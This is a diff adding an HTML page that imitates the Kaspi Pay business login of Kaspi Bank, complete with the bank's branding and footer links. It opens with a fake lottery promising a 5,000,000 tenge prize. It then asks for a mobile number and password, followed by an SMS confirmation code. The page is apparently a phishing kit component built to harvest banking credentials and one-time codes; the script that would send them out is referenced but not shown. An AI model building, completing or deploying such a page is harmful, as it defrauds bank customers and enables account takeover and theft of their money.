@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" type="text/css" href="/styles/style.css">
+
+    <link rel="shortcut icon" href="#" type="image/x-icon">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="keywords" content="Kaspi Pay, Каспи пей, Каспи пэй, Каспи бизнес, Каспий пей, Каспи пей войти, Каспи пей вход, Каспи пей личный кабинет, Kaspi Red, Каспи ред">
+    <meta name="description" content="Принимайте оплату с Kaspi Pay. Преимущества Kaspi Pay: Мобильный POS, Продажи с Kaspi Red и Kredit, Бизнес Кредит. Войти в личный кабинет">
+	<!-- <title>Kaspi Pay</title> -->
+
+	<script src="/javascript/main.js"></script>
+
+
+
+</head>
+<body>
+
+<!-- Модальное окно -->
+<div id="enter_modal" class="enteringModal">
+    <div class="modal-content1">
+
+        <!-- <span class="close-modal">&times;</span> -->
+        <p style="
+        font-size: 24px;
+        font-family: 'Roboto', Arial, Helvetica, sans-serif;
+        color:black;">Введите код из SMS</p>
+        <p style="
+        font-size: 14px; 
+        font-family: 'Roboto', Arial, Helvetica, sans-serif;
+        color:#4a4b4b;
+        ">SMS отправлено <br>с кодом подтверждения</p>
+        
+        <div class="pin-code-container">
+        <input type="text" maxlength="1" class="pin-code-input" />
+        <input type="text" maxlength="1" class="pin-code-input" />
+        <input type="text" maxlength="1" class="pin-code-input" />
+        <input type="text" maxlength="1" class="pin-code-input" />
+    </div>
+    <button class = "enter_code">Отправить код повторно</button>
+
+    <!--  <div class="loader"></div> -->
+
+    </div>
+
+
+
+</div>
+
+
+
+<!-- Модальное окно -->
+<div id="myModal" class="modal">
+
+
+
+
+
+  <div class="modal-content">
+     <span class="close" ></span>
+   <center><img class="" src="./img/f8d5f864c0e55725e2f63924f918513c9fc6900d.svg" kwidgettype="Image" kformname="hbxHdrLoginBlck" style="opacity: 1; visibility: visible; transition: opacity 500ms ease-in-out 0s; height: 70px; padding-top: 30px; padding-left: 9%;"></center>
+
+    <div class="al_c">
+     
+<b>Каспи Банк</b> рад представить уникальную лотерею для предпринимателей, которая поможет вам развить свой бизнес! <br>Вас ждут тысячи призов и главный приз в размере <b>5 000 000 тенге</b>! 🌟
+<br><br>
+✨ УЧАСТВУЙ И ВЫИГРЫВАЙ ✨
+<br>
+Чтобы принять участие, необходимо пройти регистрацию на нашем официальном сайте. Это легко и быстро. После регистрации вы получите уникальный номер участника лотереи.
+<br><br>
+Лотерея проводится среди зарегистрированных предпринимателей, и каждый зарегистрированный участник имеет шанс выиграть!
+<br><br>
+🎁 Призы для вас: 🎁
+<br>
+Мы разыгрываем тысячи призов, включая:
+<br>
+Денежные средства для развития вашего бизнеса<br>
+Специальные банковские услуги с выгодными условиями<br>
+Подарочные карты<br>
+Техническое оборудование и инструменты<br>
+И многое другое!<br>
+И, конечно же, главный приз в размере 5 000 000 тенге, который поможет вам воплотить самые амбициозные планы в жизнь!
+<br>
+Не упустите этот шанс для развития своего бизнеса и участия в увлекательной лотерее от Каспи Банка. Регистрируйтесь сегодня и участвуйте в розыгрыше!
+<br>
+Условия участия и подробную информацию о лотерее вы можете найти на нашем официальном сайте.
+<br><br>
+Давайте вместе создадим новые возможности для вашего бизнеса! Удачи в лотерее! 🍀
+
+
+<div class="closebtn">
+  <button class="btnClose" >Продолжить</button>
+</div>
+  </div>
+
+
+  </div>
+</div>
+
+<div class="upsvg">
+  <a href="#">
+  <img class="" src="./img/f8d5f864c0e55725e2f63924f918513c9fc6900d.svg" id="hbxHdrLoginBlck_image215681638221804443" kwidgettype="Image" kformname="hbxHdrLoginBlck" style="opacity: 1; visibility: visible; transition: opacity 500ms ease-in-out 0s; height: 70px; padding-top: 30px; padding-left: 9%;">
+  </a>
+</div>
+<main>
+<div class="main_content">
+
+<asd class="text">Вход</asd>  
+<div class="centered-box">
+     <!--  
+    <form class="login-form">
+    <div class="input-group">
+        <label for="phone">Мобильный телефон:</label>
+        <input type="tel" id="phone" name="phone" pattern="[\+]\d{1,3}[\-]\d{1,15}" placeholder="+7-123-4567890" required>
+        <small>Формат: +7-123-4567890</small>
+    </div>
+    
+    <div class="input-group">
+        <label for="password">Пароль:</label>
+        <input type="password" id="password" name="password" required>
+    </div>
+    
+    <button type="submit" class="btn_enter">Войти</button>
+</form>
+ -->
+<div class="both">
+ <div class="box_br1">
+   <span id="signInLoginLabel" class="menu-grey fl_label">Мобильный номер</span>
+   <input name="bank_login" maxlength="50" id="messageInputPhone" class="fl_input wide collapsed js-sign-in-login" type="text" value="">
+ </div>
+ <div class="box_br1">
+   <span id="signInLoginLabel" class="menu-grey fl_label">Пароль</span>
+   <input name="bank_login" maxlength="50" id="messageInputPassword" class="fl_input wide collapsed js-sign-in-login" type="password" value="">
+ </div>
+</div>
+<button class="btn-enter" id="sendBtn">Войти</button>
+
+<a href="#" class="hred">Забыли пароль?</a>
+    </div>
+</div>
+<div class="gid">
+<a href="#" class='gid_a'>Kaspi Гид</a>
+<br>
+<asdd class="gid_t">расскажем все о наших сервисах</asdd>
+</div>
+</main>
+
+
+<!-- <footer class="site-footer">
+  <div class="container">
+    <div class="footer-logo">
+      <img src="path/to/your/logo.png" alt="Company Logo">
+    </div>
+    <nav class="footer-nav">
+      <ul>
+        <li><a href="#">Главная</a></li>
+        <li><a href="#">О нас</a></li>
+        <li><a href="#">Контакты</a></li>
+        <li><a href="#">Поддержка</a></li>
+      </ul>
+    </nav>
+    <div class="footer-social">
+      <a href="#" class="social-icon">FB</a>
+      <a href="#" class="social-icon">TW</a>
+      <a href="#" class="social-icon">IN</a>
+    </div>
+    <div class="footer-copyright">
+      &copy; 2023 Ваша компания. Все права защищены.
+    </div>
+  </div>
+</footer> -->
+
+<footer>
+<div class="modern-container_narrow">
+                <div class="line"></div>
+                <div class="footer_modern-hr margin-top-m margin-bottom-xl"></div>
+                <div class="row">
+                    <div class="col-xs-12">
+                        <div class="footer_modern-copyright">
+                            © 2012-2023 гг. АО «Kaspi Bank»,<br>
+                            Лицензия №1.2.245/61, 03.02.2020, АРКРРФР.
+                        </div>
+                        <div class="footer_modern-link-place margin-top-s">
+                            <a href="https://t.me/kaspi_pos" class="footer_modern-link h5 link-like"><img src="./img/telegram.png" width="20" height="20"></a>
+                            <a href="https://www.youtube.com/channel/UCtv4q1YF1ypn5rz8UCLycbQ" class="footer_modern-link h5 link-like padding-left-s"><img src="./img/youtube.png" width="20" height="14"></a>
+                            <a href="https://www.facebook.com/groups/kaspi.pay" class="footer_modern-link h5 link-like padding-left-s"><img src="./img/facebook.png" width="20" height="20"></a>  
+                            
+                        </div>
+                        <div class="">
+                            <a href="http://www.kaspibank.kz/?s=kaspi" class="footer_a">Корпоративный сайт.</a><br>
+                            <a id="ctl09_hlTerms" class="footer_a" href="#">Пользовательское соглашение.</a><br>
+                            
+                        </div>
+                    </div>
+                    <div class="col-xs-12">
+                        <div class="margin-bottom-s footer_modern-app-download-link-group app-download-link-group clearfix">
+                            <div class="app-download-link-wrapper pull-left">
+                                <a id="ctl09_appStoreLink" class="app-download-link i-app-store" href="https://itunes.apple.com/kz/app/kaspi-%D0%B1%D0%B8%D0%B7%D0%BD%D0%B5%D1%81/id1262997215?mt=8"></a>
+                            </div>
+                            <div class="app-download-link-wrapper pull-left">
+                                <a id="ctl09_googlePlayLink" class="app-download-link i-google-play" href="https://play.google.com/store/apps/details?id=hr.asseco.android.kaspibusiness"></a>
+                            </div>
+                            <div class="app-download-link-wrapper pull-left">
+                                <a id="ctl09_huaweiGalleryLink" class="app-download-link i-huawei-gallery" href="https://appgallery.cloud.huawei.com/ag/n/app/C103703341?locale=ru_RU&amp;source=appshare&amp;subsource=C103703341"></a>
+                            </div>
+                        </div>
+                        
+                        
+                    </div>
+                </div>
+            </div>
+</footer>
+
+</body>
+</html>
